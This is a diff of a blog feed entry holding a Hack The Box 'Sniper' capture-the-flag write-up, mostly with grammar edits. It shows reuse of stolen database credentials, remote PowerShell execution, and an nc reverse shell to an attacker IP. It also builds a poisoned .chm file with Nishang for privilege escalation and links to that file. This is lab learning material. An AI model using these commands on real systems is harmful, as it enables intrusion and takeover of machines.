+&lt;p&gt;After I noticed port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; was opened I visited that site and got this as output.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/public/images/sniper_htb.jpg&quot; alt=&quot;sniperhtb&quot; /&gt;&lt;/p&gt;
 
@@ -92,7 +395,7 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\gr4n173&amp;gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Then I found the &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris&lt;/code&gt; user. Since I m in unprivelege I wasn’t given any permission.&lt;/p&gt;
+&lt;p&gt;Then I found the &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris&lt;/code&gt; user. Since I m unprivelege user so no any permission was granted.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users&amp;gt; ls
 ls
@@ -120,7 +423,7 @@ more db.php
   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;By combining creds and &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; I got the user shell. Before that I created the folder &lt;code class=&quot;highlighter-rouge&quot;&gt;files&lt;/code&gt; and downloaded the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; tool inside. Since it’s2020 as python2 died so I used python3 server as&lt;/p&gt;
+&lt;p&gt;By combining creds and &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; I got the user shell. Before that I created the folder &lt;code class=&quot;highlighter-rouge&quot;&gt;files&lt;/code&gt; and downloaded the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; tool inside. Since it’s 2020 as python2 died so I used python3 server as&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\gr4n173&amp;gt; cd files
 cd files
@@ -145,7 +448,7 @@ PS C:\gr4n173\files&amp;gt; Invoke-Command -Computer Sniper -ScriptBlock { whoam
 Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred 
 sniper\chris
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;From above command, at first I defined a variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$pass&lt;/code&gt; which store the password and another variable &lt;code class=&quot;highlighter-rouge&quot;&gt;cred&lt;/code&gt; for passing the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pass&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt; and final command give the output of &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; after passing the two variable to &lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt;. This indicate I can run the &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt; .&lt;/p&gt;
+&lt;p&gt;In above command, at first I defined a variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$pass&lt;/code&gt; which store the password and another variable &lt;code class=&quot;highlighter-rouge&quot;&gt;cred&lt;/code&gt; for passing the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pass&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt; and last one gaves the output of command &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt;. Hence I can run the &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt; .&lt;/p&gt;
 
 &lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h2&gt;
 
@@ -166,7 +469,7 @@ PS C:\Users\Chris\Documents&amp;gt; hostname
 hostname
 Sniper
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;This way finally I got the user.&lt;/p&gt;
+&lt;p&gt;This way I got the user.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users\Chris\Desktop&amp;gt; ls
 ls
@@ -186,7 +489,7 @@ more user.txt
 &lt;hr /&gt;
 &lt;h2 id=&quot;user-to-root&quot;&gt;User to Root&lt;/h2&gt;
 
-&lt;p&gt;For root I searched every part of the user shell and got the uncomplete &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file inside Chris’s Downloads:&lt;/p&gt;
+&lt;p&gt;For root I searched every part of the user shell and uncomplete &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file was found inside Chris’s Downloads directory:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users\Chris\Downloads&amp;gt; ls
 ls
@@ -200,7 +503,7 @@ Mode                LastWriteTime         Length Name
 
 &lt;h3 id=&quot;poisoning-chm&quot;&gt;Poisoning .chm&lt;/h3&gt;
 
-&lt;p&gt;Now to posioion I used &lt;code class=&quot;highlighter-rouge&quot;&gt;Out-CHM.ps1&lt;/code&gt; while  from &lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;Nishang&lt;/a&gt; which is quite Interesting git repo especially related to window.&lt;/p&gt;
+&lt;p&gt;In order to poison, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;Out-CHM.ps1&lt;/code&gt; while  from &lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;Nishang&lt;/a&gt; which is quite Interesting git repo especially related to window.&lt;/p&gt;
 
 &lt;p&gt;I used nishand tool and opened it in powershell.&lt;/p&gt;
 
@@ -217,7 +520,7 @@ Mode                LastWriteTime         Length Name
 10.10.14.11 8888 -e powershell&quot; -HHCPath &quot;C:\Program Files (x86)\HTML
 Help Workshop&quot; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Here, I defined the dir of &lt;code class=&quot;highlighter-rouge&quot;&gt;nc64.exe&lt;/code&gt; and used &lt;a href=&quot;https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7&quot;&gt;this&lt;/a&gt; to exploit. File named &lt;code class=&quot;highlighter-rouge&quot;&gt;doc.chm&lt;/code&gt; created and you can get here &lt;a href=&quot;/public/files/doc.chm&quot;&gt;file&lt;/a&gt;.This way I created the poison of &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file&lt;/p&gt;
+&lt;p&gt;Here, I defined the dir of &lt;code class=&quot;highlighter-rouge&quot;&gt;nc64.exe&lt;/code&gt; and used &lt;a href=&quot;https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7&quot;&gt;this&lt;/a&gt; to exploit. File name &lt;code class=&quot;highlighter-rouge&quot;&gt;doc.chm&lt;/code&gt; was created and you can get here &lt;a href=&quot;/public/files/doc.chm&quot;&gt;file&lt;/a&gt;. This way I created the poison of &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file.&lt;/p&gt;
 
 &lt;p&gt;Now I downloaded the created file to user shell &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris&lt;/code&gt; with a listener on along with the &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 server&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/pub&lt;/code&gt;&lt;/p&gt;
 
@@ -243,9 +546,11 @@ PS C:\Users\Administrator\Desktop&amp;gt; more root.txt
 
 &lt;p&gt;This way I got the root of Sniper box and learned alot from this box. So I would like to thank creators of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;MinatoTW &amp;amp; felamos&lt;/code&gt; for such an awesome box. Especially poisoning &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; was awesome.&lt;/p&gt;
 
-&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. 
-Feedback are really appreciated !!
-Tweet about this writeup if you like.&lt;/p&gt;
+&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;/p&gt;
+
+&lt;p&gt;Feedback are really appreciated !!&lt;/p&gt;
+
+&lt;p&gt;Tweet about this writeup if you like.&lt;/p&gt;
 
 &lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="windows" /><category term="SMB" /><category term=".chm" /><category term="Powershell" /><category term="nc.exe" /><category term="webshell" /><category term="Invoke" /><category term="nishang" /><category term="htb" /><summary type="html">HTB:Sniper</summary></entry><entry><title type="html">OAuth 2</title><link href="http://localhost:4000/2020/03/22/oauth-2.html" rel="alternate" type="text/html" title="OAuth 2" /><published>2020-03-22T00:00:00+05:45</published><updated>2020-03-22T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/22/oauth-2</id><content type="html" xml:base="http://localhost:4000/2020/03/22/oauth-2.html">&lt;hr /&gt;
 
